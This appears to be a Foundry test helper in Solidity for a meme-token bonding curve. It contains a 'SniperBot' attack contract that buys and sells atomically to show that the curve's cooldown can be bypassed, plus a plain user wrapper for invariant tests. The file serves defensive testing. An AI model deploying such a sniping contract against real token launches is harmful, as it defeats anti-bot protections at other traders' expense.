// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../../../contracts/BondingCurve.sol";
import "../../../contracts/MemeToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Attacker contract that buys then immediately sells in the same tx
///      to prove cooldown bypass.
contract SniperBot {
    BondingCurveBNB public curve;
    IERC20 public token;

    constructor(address _curve, address _token) {
        curve = BondingCurveBNB(payable(_curve));
        token = IERC20(_token);
        token.approve(address(curve), type(uint256).max);
    }

    /// @notice Atomic buy-then-sell: proves zero cooldown between curve buy and sell
    function buyAndDump(uint256 deadline) external payable returns (uint256 profit) {
        uint256 bnbBefore = address(this).balance - msg.value;

        // Buy
        curve.buyWithBNB{value: msg.value}(0, deadline);
        uint256 tokensGot = token.balanceOf(address(this));

        // Immediately sell — should be blocked by cooldown but isn't
        if (tokensGot > 0) {
            curve.sell(tokensGot, 0, deadline);
        }

        uint256 bnbAfter = address(this).balance;
        // Return doesn't matter — the point is this tx didn't revert
        profit = bnbAfter > bnbBefore ? bnbAfter - bnbBefore : 0;
    }

    receive() external payable {}
}

/// @dev Wrapper so Foundry invariant handler can call buy/sell as a regular user
contract UserActor {
    BondingCurveBNB public curve;
    MemeToken public token;

    constructor(address _curve, address _token) {
        curve = BondingCurveBNB(payable(_curve));
        token = MemeToken(_token);
        token.approve(address(curve), type(uint256).max);
    }

    function buy(uint256 deadline) external payable {
        curve.buyWithBNB{value: msg.value}(0, deadline);
    }

    function sell(uint256 amount, uint256 deadline) external {
        uint256 bal = token.balanceOf(address(this));
        if (amount > bal) amount = bal;
        if (amount == 0) return;
        curve.sell(amount, 0, deadline);
    }

    function balance() external view returns (uint256) {
        return token.balanceOf(address(this));
    }

    receive() external payable {}
}
